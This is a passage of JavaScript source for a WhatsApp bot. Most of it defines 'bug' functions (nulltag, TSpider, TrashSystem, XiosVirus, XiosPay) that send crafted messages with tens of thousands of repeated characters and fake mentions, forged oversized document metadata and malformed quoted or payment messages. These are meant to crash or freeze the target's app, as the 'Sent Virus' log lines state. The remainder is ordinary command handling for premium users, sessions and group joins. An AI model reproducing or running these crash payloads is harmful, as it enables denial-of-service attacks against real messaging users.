								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAsamBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vsamkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://www.instagram.com/WhatsApp",
								"mediaUrl": "https://www.instagram.com/WhatsApp",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://www.instagram.com/WhatsApp"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"issampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.red("Succes Send Bug "));
		};
    //========================
    async function nulltag(target, ptcp = false) {
			await dare.relayMessage(target, {
					extendedTextMessage: {
						text: "‎samMIC-V2\n" + "~@0~\n".repeat(30000),
						contextInfo: {
							mentionedJid: [
								"0@null",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@null`)
							],
							stanzaId: "1234567890ABCDEF",
							participant: "0@null",
							quotedMessage: {
								callLogMesssage: {
									isVideo: true,
									callOutcome: "1",
									durationSecs: "0",
									callType: "REGULAR",
									participants: [{
										jid: "0@null",
										callOutcome: "1"
									}]
								}
							},
							remoteJid: target,
							conversionSource: " p ",
							conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAsamBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vsamkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
							conversionDelaySeconds: 10,
							forwardingScore: 9999999,
							isForwarded: true,
							quotedAd: {
								advertiserName: " p ",
								mediaType: "IMAGE",
								jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAsamBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vsamkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								caption: " p "
							},
							placeholderKey: {
								remoteJid: "0@s.whatsapp.net",
								fromMe: false,
								id: "ABCDEF1234567890"
							},
							expiration: 86400,
							ephemeralSettingTimestamp: "1728090592378",
							ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							externalAdReply: {
								title: "̟",
								body: "̟",
								mediaType: "VIDEO",
								renderLargerThumbnail: true,
								previewType: "VIDEO",
								thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
								sourceType: " p ",
								sourceId: " p ",
								sourceUrl: "p",
								mediaUrl: "p",
								containsAutoReply: true,
								showAdAttribution: true,
								ctwaClid: "ctwa_clid_example",
								ref: "ref_example"
							},
							entryPointConversionSource: "entry_point_source_example",
							entryPointConversionApp: "entry_point_app_example",
							entryPointConversionDelaySeconds: 5,
							disappearingMode: {},
							actionLink: {
								url: "p"
							},
							groupSubject: " p ",
							parentGroupJid: "6287888888888-1234567890@g.us",
							trustBannerType: " p ",
							trustBannerAction: 1,
							issampled: false,
							utm: {
								utmSource: " p ",
								utmCampaign: " p "
							},
							forwardedNewsletterMessageInfo: {
								newsletterJid: "6287888888888-1234567890@g.us",
								serverMessageId: 1,
								newsletterName: " p ",
								contentType: "UPDATE",
								accessibilityText: " p "
							},
							businessMessageForwardInfo: {
								businessOwnerJid: "0@s.whatsapp.net"
							},
							smbClientCampaignId: "smb_client_campaign_id_example",
							smbServerCampaignId: "smb_server_campaign_id_example",
							dataSharingContext: {
								showMmDisclosure: true
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.green("bot Sent Virus ✅"));
		};
    //========================
    async function TSpider(target, pic, Ptcp = true) {
   await dare.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "᳀ 𝐏᪲᪱‌𝐫𝐒𝐩𝐢𝐝𝐞𝐫-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞 メ",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: pic,
         },
         hasMediaAttachment: true,
        },
        body: {
         text: "🏴‍☠️ 𝐏᪲᪱‌𝐫𝐒𝐩𝐢𝐝𝐞𝐫-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞 🦣\n" + "@6285655649546".repeat(17000),
        },
        nativeFlowMessage: {
         buttons: [{
           name: "cta_url",
           buttonParamsJson: "{ display_text: '✨⃟༑⌁⃰𝐒𝐩𝐢𝐝𝐞𝐫 𝐂𝐫𝐚𝐬𝐡 ϟ〽️', url: \"https://youtube.com/king_sam_hub\", merchant_url: \"https://youtube.com/king_sam_hub\" }",
          },
          {
           name: "call_permission_request",
           buttonParamsJson: "{}",
          },
         ],
         messageParamsJson: "{}",
        },
        contextInfo: {
         mentionedJid: ["6285655649546@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9〽️",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: target
     }
    } : {}
   );
   console.log(chalk.green("Send Bug By Spider〽️"));
  };
async function TrashSystem(target, spider, Ptcp = true) {
   await dare.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "᳀ 𝐏᪲᪱‌𝐫𝐒𝐩𝐢𝐝𝐞𝐫-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞 メ",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: spider,
         },
         hasMediaAttachment: true,
        },
        body: {
         text: "🏴‍☠️ 𝐏᪲᪱‌𝐫𝐒𝐩𝐢𝐝𝐞𝐫-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞 🦣\n" + "@6285655649546".repeat(17000),
        },
        contextInfo: {
         mentionedJid: ["6285655649546@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9〽️",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: spider,
          },
         },
        },
       },
      },
     },
    },
    ptcp ? { participant: { jid: target } } : {}
    );
};
async function XiosVirus(jid) {
			dare.relayMessage(jid, {
				'extendedTextMessage': {
					'text': '.',
					'contextInfo': {
						'stanzaId': jid,
						'participant': jid,
						'quotedMessage': {
							'conversation': '⭑̤⟅̊༑ ▾ ⋆✩⋆ 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐫 𝐕𝟓 𝐕𝐢𝐩 ⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': jid
				}
			}, {
				'messageId': null
			});
			console.log(chalk.red("Succes Send Bug"));
		};

		async function XiosPay(jid) {
			dare.relayMessage(jid, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': jid
				}
			});
			console.log(chalk.red("Succes Send Bug"));
		};

//===================°°
const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285624297893:+62 856-2429-7893\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}
//end bug functions

async function loading () {
var xeonlod = [
"《 𝕷𝖔𝖘𝖙𝖇𝖔𝖞》10%",
"《 𝖝》30%",
"《 𝖑𝖔𝖗𝖉 𝖙𝖊𝖈𝖍》50%",
"《 =》80%",
"《 𝖈𝖘𝖚𝖎𝖙》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
]
let { key } = await dare.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < xeonlod.length; i++) {
await dare.sendMessage(from, {text: xeonlod[i], edit: key });
}
}

        if (!dare.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            dare.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        dare.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        dare.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        dare.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        dare.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
        if (autobio) {
            dare.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('91') && global.anti91 === true) {
            return dare.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await dare.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await dare.getName(i)}\nFN:${await dare.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./dtbs/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./dtbs/total-hit-user.json'))[0].hit_cmd
        }
        
for (let BhosdikaXeon of VoiceNoteXeon) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./dmedia/audio/${BhosdikaXeon}.mp3`)
dare.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./dmedia/sticker/${BhosdikaXeon}.webp`)
dare.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of Imagedare){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./dmedia/image/${BhosdikaXeon}.jpg`)
dare.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./dmedia/video/${BhosdikaXeon}.mp4`)
dare.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
dare.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXeon of ApkXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./dmedia/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
dare.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXeon of ZipXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./dmedia/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaXeon of DocXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./dmedia/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}
        
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    replydare(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./dtbs/afk-user.json', JSON.stringify(_afk))
                dare.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
            case 'addprem':
                if (!isCreator) return replydare(mess.owner)
                if (args.length < 2)
                    return replydare(`Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    replydare("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    replydare("Success")
                }
                break
            case 'delprem':
                if (!isCreator) return replydare(mess.owner)
                if (args.length < 1) return replydare(`Use :\n*#delprem* @tag\n*#delprem* number`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
                        fs.writeFileSync("./dtbs/premium.json", JSON.stringify(premium));
                    }
                    replydare("Delete success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
                    fs.writeFileSync("./dtbs/premium.json", JSON.stringify(premium));
                    replydare("Success")
                }
                break
            case 'listprem': {
                if (!isCreator) return replydare(mess.owner)
                let data = require("./dtbs/premium.json")
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let i of data) {
                    txt += `Number : ${i.id}\n`
                    txt += `Expired : ${i.expired} Second\n`         
                }                
                dare.sendMessage(m.chat, {
                    text: txt,
                    mentions: i
                }, {
                    quoted: m
                })
            }
            break
            case 'deletesession':
            case 'delsession':
            case 'clearsession': {
                if (!isCreator) return replydare(mess.owner)
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return replydare('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return replydare(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    replydare(teks)
                    await sleep(2000)
                    replydare("Delete junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    replydare("Successfully deleted all the trash in the session folder")
                });
            }
            break
            case 'join':
                try {
                    if (!isCreator) return replydare(mess.owner)
                    if (!text) return replydare('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replydare('Link Invalid!')
                    replydare(mess.wait)
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    await dare.groupAcceptInvite(result).then((res) => replydare(json(res))).catch((err) => replydare(json(err)))
                } catch {
                    replydare('Failed to join the Group')
                }
                break      
            case 'getsession':
                if (!isCreator) return replydare(mess.owner)
